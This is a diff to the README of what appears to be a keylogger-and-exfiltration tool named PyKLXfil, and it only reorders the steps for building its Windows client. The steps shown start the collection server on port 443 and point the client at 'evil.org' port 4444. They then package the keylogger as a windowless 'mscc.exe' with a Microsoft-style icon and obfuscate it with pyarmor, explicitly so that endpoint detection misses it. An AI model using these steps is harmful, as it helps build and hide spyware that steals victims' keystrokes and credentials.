@@ -25,13 +25,14 @@ python3 PyKLXfil-Server.py 0.0.0.0 443 &
  #self.host = 'evil.org'
  #self.port = 4444
  ```
- * Make obfuscated Windows executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
+ * Make Windows executable client by either of the ways:
+ 1. obfuscated Windows executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
  ```sh
  pip3 install pyarmor
  pip3 install pyinstaller
  pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client.py -n mscc.exe
  ```
- * Compile the script to exe using pyinstaller:
+ 2. Compile the script to exe using pyinstaller:
 ```sh
 pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client.py
 ```
